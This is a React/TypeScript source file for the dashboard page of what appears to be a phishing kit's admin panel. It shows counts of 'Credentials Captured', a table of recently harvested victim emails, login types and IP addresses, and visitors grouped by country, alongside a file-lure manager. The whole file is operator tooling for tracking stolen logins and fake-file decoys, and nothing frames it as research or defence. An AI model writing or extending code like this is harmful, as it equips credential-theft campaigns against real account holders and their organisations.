import { createFileRoute, Link } from "@tanstack/react-router";
import { CheckCircle, Download, File, Plus, Settings, Users, Globe } from "lucide-react";
import { useEffect, useState } from "react";

import { StatCard } from "@/components/settings/StatCard";
import { AdminCard, PageHeader, StatusBadge } from "@/components/settings/ui";
import { adminMeta } from "@/lib/admin/meta";
import { fetchStats, type StatsData } from "@/lib/admin/sample-logs";
import { getAdminToken, useAdmin } from "@/lib/admin/store";

export const Route = createFileRoute("/settings/_panel/dashboard")({
  head: () => adminMeta("Dashboard", "Overview of website activity and statistics."),
  component: Dashboard,
});

const actionClass =
  "inline-flex h-[42px] w-full items-center justify-center gap-2 rounded-[4px] px-5 text-[14px] font-medium outline-none transition focus-visible:shadow-adm-focus active:scale-[0.98] sm:w-auto";

function Dashboard() {
  const files = useAdmin((s) => s.files);
  const [stats, setStats] = useState<StatsData | null>(null);
  const [loading, setLoading] = useState(true);
  const token = getAdminToken();

  useEffect(() => {
    if (token) {
      fetchStats(token).then((data) => {
        setStats(data);
        setLoading(false);
      }).catch(() => {
        setLoading(false);
      });
    }
  }, [token]);

  const active = files.filter((f) => f.active);
  const totalVisitors = stats?.total_visitors || 0;
  const totalCredentials = stats?.total_credentials || 0;
  const recentSubmissions = stats?.recent_submissions || [];
  const byCountry = stats?.by_country || {};

  return (
    <div className="mx-auto max-w-[1200px]">
      <PageHeader title="Dashboard" subtitle="Overview of website activity and statistics." />

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-4">
        <StatCard icon={Users} title="Total Visitors" value={String(totalVisitors)} label="Unique visitors" />
        <StatCard icon={Download} title="Credentials Captured" value={String(totalCredentials)} label="Total submissions" />
        <StatCard icon={File} title="Active Files" value={String(active.length)} label="Displayed files" />
        <StatCard
          icon={CheckCircle}
          title="System Status"
          value="Online"
          label="All systems operational"
          tone="success"
        />
      </div>

      <div className="mt-8 grid grid-cols-[minmax(0,1fr)] gap-4 lg:grid-cols-[minmax(0,1fr)_minmax(0,1.4fr)]">
        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">Quick Actions</h2>
          <p className="mt-1 text-[14px] text-adm-text-soft">Jump to the most common tasks.</p>
          <div className="mt-5 flex flex-col gap-3 sm:flex-row sm:flex-wrap">
            <Link to="/settings/panel/files" className={`${actionClass} bg-adm-primary text-primary-foreground hover:bg-adm-primary-dark`}>
              <Plus className="size-[18px]" /> Add New File
            </Link>
            <Link
              to="/settings/panel/config"
              className={`${actionClass} border-2 border-adm-primary bg-card text-adm-primary hover:bg-adm-primary/5`}
            >
              <Settings className="size-[18px]" /> Update Configuration
            </Link>
          </div>
          <div className="mt-4 flex flex-col gap-3 sm:flex-row sm:flex-wrap">
            <Link
              to="/settings/panel/stats"
              className={`${actionClass} border-2 border-adm-primary bg-card text-adm-primary hover:bg-adm-primary/5`}
            >
              <Users className="size-[18px]" /> View Statistics
            </Link>
            <Link
              to="/settings/panel/change-token"
              className={`${actionClass} border-2 border-adm-warning bg-card text-adm-warning hover:bg-adm-warning/5`}
            >
              <Globe className="size-[18px]" /> Change Access Token
            </Link>
          </div>
        </AdminCard>

        <AdminCard>
          <h2 className="text-[20px] font-semibold text-adm-text">Recent Activity</h2>
          <p className="mt-1 text-[14px] text-adm-text-soft">Latest credential submissions.</p>
          
          {loading ? (
            <div className="mt-4 text-center text-adm-text-soft">Loading...</div>
          ) : recentSubmissions.length > 0 ? (
            <div className="mt-4 overflow-x-auto">
              <table className="w-full text-left text-[13px]">
                <thead className="text-adm-text-soft">
                  <tr className="border-b border-adm-border">
                    <th className="pb-2 pr-4 font-medium">Email</th>
                    <th className="pb-2 pr-4 font-medium">Type</th>
                    <th className="pb-2 pr-4 font-medium">IP</th>
                    <th className="pb-2 font-medium">Time</th>
                  </tr>
                </thead>
                <tbody>
                  {recentSubmissions.slice(0, 5).map((sub) => (
                    <tr key={sub.id} className="border-b border-adm-border/50">
                      <td className="py-2 pr-4">
                        <span className="font-medium">{sub.email}</span>
                      </td>
                      <td className="py-2 pr-4">
                        <StatusBadge tone="info">{sub.login_type}</StatusBadge>
                      </td>
                      <td className="py-2 pr-4 text-adm-text-soft">{sub.ip_address}</td>
                      <td className="py-2 text-adm-text-soft">{new Date(sub.created_at).toLocaleString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="mt-4 text-center text-adm-text-soft">No recent activity</div>
          )}
          
          {recentSubmissions.length > 5 && (
            <Link to="/settings/panel/stats" className="mt-4 block text-center text-adm-blue hover:text-adm-blue-hover">
              View all activity →
            </Link>
          )}
        </AdminCard>
      </div>

      {Object.keys(byCountry).length > 0 && (
        <AdminCard className="mt-4">
          <h2 className="text-[20px] font-semibold text-adm-text">Visitors by Country</h2>
          <div className="mt-4 grid grid-cols-2 gap-4 sm:grid-cols-3 lg:grid-cols-5">
            {Object.entries(byCountry).map(([country, count]) => (
              <div key={country} className="rounded-[6px] bg-adm-bg p-3 text-center">
                <div className="text-[16px] font-bold text-adm-text">{count}</div>
                <div className="text-[12px] text-adm-text-soft truncate">{country}</div>
              </div>
            ))}
          </div>
        </AdminCard>
      )}
    </div>
  );
}
